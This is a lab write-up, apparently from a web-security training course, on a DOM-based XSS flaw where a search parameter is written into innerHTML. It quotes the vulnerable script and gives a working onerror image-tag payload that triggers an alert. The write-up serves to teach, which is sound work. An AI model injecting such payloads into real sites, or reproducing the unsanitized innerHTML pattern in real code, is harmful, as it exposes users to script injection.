# LAB 4 :

### 🚩 **Vulnerability Overview**

This lab demonstrates a DOM-based cross-site scripting vulnerability in the search blog functionality which uses `innerhtml` ; which changes the HTML contents of a `div` element, using data from `location.search` . 

---

### **🔍 Cause**

```markdown
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```

The script in the source code uses `URLSearchParams` to capture the `search` parameter from `window.location.search`. It then passes this raw, unsanitized string to the `doSearchQuery` function .

---

### **🛠️ Solution**

I have Solved this lab using the following payload because the url takes the search query in this format `?search=<img+src="x"+onerror="alert('Hacked')">`  for the malicious payload that i inject now this renders like this in the webpage :

```markdown
<span id="searchMessage">
    <img src="No-There" onerror="alert('Hacked')">
</span>
```

Since there is no image named No-There the onerror funtion will trigger the alert function !!
**Payload :**

```markdown
<img src="No-There" onerror="alert('Hacked')">
```

<img src="Images/L4-1.png" alt="L4-1" width="600">

<img src="Images/L4-2.png" alt="L4-2" width="600">

<img src="Images/L4-3.png" alt="L4-3" width="600">
